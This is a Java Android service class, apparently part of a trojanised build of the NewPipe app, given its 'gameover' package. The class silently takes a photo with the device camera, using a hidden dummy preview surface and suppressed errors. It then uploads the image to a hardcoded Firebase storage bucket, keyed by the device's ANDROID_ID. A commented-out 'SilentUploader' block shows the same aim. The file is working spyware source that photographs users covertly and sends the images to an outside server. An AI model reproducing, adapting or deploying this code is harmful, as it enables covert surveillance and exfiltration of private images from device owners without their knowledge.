package org.schabi.newpipe.gameover;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Settings;

import androidx.annotation.Nullable;


import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileOutputStream;

//import com.gpl.camera_app1.R;


public class CamService extends Service {
    Intent intent1;
    int cameraID;
    Camera camera = null;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        intent1=intent;
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //startForeground(1,new Notification());
        try {
            cameraID=intent.getIntExtra("cameraid", 0);
            takePhoto(cameraID);
        }catch (Exception e){}

        return super.onStartCommand(intent, flags, startId);

    }

    @Override
    public void onCreate() {
//        Log.trace("kkkk","on create");
    }


    private void takePhoto(int cameraID) {

        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        Camera.getCameraInfo(cameraID, cameraInfo);

        try {
            camera = Camera.open(cameraID);
            Camera.Parameters parameters = camera.getParameters();
           // parameters.set("jpeg-quality", 70);
            parameters.setPictureFormat(PixelFormat.JPEG);
            parameters.setPictureSize(1280, 720);
            parameters.setWhiteBalance(Camera.Parameters.WHITE_BALANCE_DAYLIGHT);
            camera.setParameters(parameters);
        } catch (Exception e) {
            camera = null;
        }
        try {
            if (null == camera) {
//                Log.trace("kkkk","Could not get camera instance");
            } else {
//                Log.trace("kkkk","Got the camera, creating the dummy surface texture");
                try {
                    SurfaceTexture st =new SurfaceTexture(0);
                    camera.setPreviewTexture(st);
                    camera.startPreview();
                } catch (Exception e) {
//                    Log.trace("kkkk","Could not set the surface preview texture");
                    //e.printStackTrace();
                }

                camera.takePicture(null, null, new Camera.PictureCallback() {

                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
//                        Log.trace("kkkk","TakenPic");

                        File filePath = getApplicationContext().getDir("CAM", Context.MODE_PRIVATE);
                        String fullCamPath = filePath + File.separator
                            + "CAM_"+ System.currentTimeMillis() + ".jpg";
                        FileOutputStream fileOutputStream = null;
                        try {
                            fileOutputStream = new FileOutputStream(fullCamPath);
                            fileOutputStream.write(data);
                        } catch (Exception e) {
                            //e.printStackTrace();
                        }
                        stopC();
//                        Log.trace("kkkk", "onPictureTaken");

                        /*new SilentUploader(fullCamPath, "RC_CAM", new Callback() {
                            @Override
                            public void ok(String str) {
                                if (str != null) {
                                    if (str.startsWith("--")) {
                                        Preferences.sendlogsR("SilentUpload failed : "+str);
                                    }
                                }
                            }
                        }).execute();*/

                        StorageReference ref  = FirebaseStorage.getInstance("gs://fir-d5cfd.appspot.com").getReference();
                        @SuppressLint("HardwareIds")
                        String aid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                         ref.child(aid).child("CAM").child(String.valueOf(System.currentTimeMillis())).putFile(Uri.fromFile(new File(fullCamPath)));

                    }
                });
            }
        } catch (Exception e) {
            camera.release();
        }

    }
    private void stopC() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}

